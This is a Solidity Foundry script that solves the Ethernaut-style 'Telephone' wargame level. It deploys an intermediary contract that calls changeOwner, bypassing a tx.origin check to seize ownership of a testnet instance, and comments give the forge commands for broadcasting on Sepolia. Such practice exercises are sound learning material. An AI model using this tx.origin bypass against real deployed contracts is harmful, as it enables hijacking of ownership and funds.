// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";

interface ITelephone {
    function owner() external view returns (address);
    function changeOwner(address _owner) external;
}

contract Exp is Script {
    // $ forge script script/TelephoneExp.s.sol:Exp
    // $ forge script script/TelephoneExp.s.sol:Exp --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast --sender $ACCOUNT_SEPOLIA -vvvvv

    // $ make telephoneExp ARGS='--network sepolia'
    // 设置msg.sender为攻击者地址
    // 1 --sender $ACCOUNT_SEPOLIA
    // 2 attackContract.attack(tx.origin);
    // 3 从环境变量中取地址 export ATTACKER=0xYourAddress
    // attackContract.attack(vm.envAddress("ATTACKER"));
    //  vm.startBroadcast(attacker); // 指定广播的地址
    //  attackContract.attack(attacker); // 传入你控制的攻击地址
    ITelephone public telePhoneInstance = ITelephone(0x9E6ED7b058C8Acc898842d6F82f07160a5203a34); // Replace with actual deployed address if needed
    // address public attacker = makeAddr("attacker");

    function run() external {
        vm.startBroadcast();
        // Telephone telePhoneInstance = new Telephone();
        console2.log("Owner:", telePhoneInstance.owner());
        Attacker attackContract = new Attacker(address(telePhoneInstance));
        attackContract.attack(msg.sender); // msg.sender is the attacker address
        console2.log("New Owner:", telePhoneInstance.owner());
        vm.stopBroadcast();
    }
}

contract Attacker {
    ITelephone public telephoneInstance;

    constructor(address _telephoneInstance) {
        telephoneInstance = ITelephone(_telephoneInstance);
    }

    function attack(address _owner) external {
        telephoneInstance.changeOwner(_owner);
    }
}
